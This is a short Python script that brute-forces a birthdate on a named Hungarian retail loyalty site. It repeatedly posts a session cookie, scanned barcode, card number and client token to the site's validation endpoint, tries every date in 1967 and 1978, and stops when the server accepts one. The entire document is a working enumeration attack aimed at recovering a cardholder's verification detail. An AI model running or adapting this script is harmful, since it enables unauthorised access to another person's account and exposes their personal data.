#!/usr/bin/env python3
import requests
from time import sleep

cookies = {
    'PHPSESSID': '<SESSION ID>',
}

data = {
  'code': '<SCANNED BARCODE>',
  'email': 'foo@example.com',
  'cardnumber': '1234123456785678',
  'verification_consent': '1',
  'client_token': "<CLIENT TOKEN>"
}

ymd_str="{:04d}-{:02d}-{:02d}"

for year in [1967,1978]:
	for month in range(1,12):
		for day in range(1, 31):
			data['birthdate'] = ymd_str.format(year, month, day)
			response = requests.post('https://www.supershop.hu/nyerjen/request/validation/', cookies=cookies, data=data)
			d=response.json()
			if(d["status"]==201):
				print(data['birthdate'])
				exit()
			print(d["status"])
			sleep(.5)
